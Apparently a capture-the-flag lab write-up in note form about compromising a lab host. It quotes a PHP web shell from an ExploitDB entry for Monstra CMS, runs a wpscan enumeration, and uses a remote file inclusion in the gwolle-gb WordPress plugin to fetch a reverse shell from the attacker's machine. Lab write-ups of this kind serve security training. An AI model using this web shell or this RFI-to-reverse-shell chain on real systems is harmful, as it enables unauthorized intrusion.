Found a public exploit for authenticated RCE for Monstra CMS 3.0.4 ([ExploitDB](https://www.exploit-db.com/exploits/49949))

- For some reason this exploit did not work. Found another exploit on ExploitDB - 43348 that provides manual steps to reproduce RCE

```txt
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

<?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.
```

- This did not work either
- Ran gobuster on http://10.10.10.88/webservices and found a wordpress directory that was not part of robots.txt
- http://10.10.10.88/webservices/wp/
- Ran `wpscan`
```bash
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive
```
- Found a plugin gwolle-gb that is vulnerable to RFI
- Verified RFI by making a request to 
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.7/
- It by default made a request to
![[Pasted image 20240903114705.png]]
- copied php-reverse-shell.php and renamed it to wp-load.php which the server fetches by default
- http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.7:8888/
- Got reverse shell as `www-data`